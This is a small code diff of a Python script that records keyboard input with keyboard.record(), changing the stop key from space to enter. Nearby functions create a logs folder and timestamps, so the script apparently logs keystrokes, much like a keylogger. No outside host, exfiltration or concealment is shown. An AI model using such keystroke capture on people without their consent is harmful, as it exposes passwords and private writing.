@@ -7,7 +7,7 @@ def checkLogsPath(path):
         os.mkdir(path)
 
 def recording():
-    return keyboard.record(until=('space'))
+    return keyboard.record(until=('enter'))
 
 def calcualteDataAndHour():
     tempTime = datetime.now()
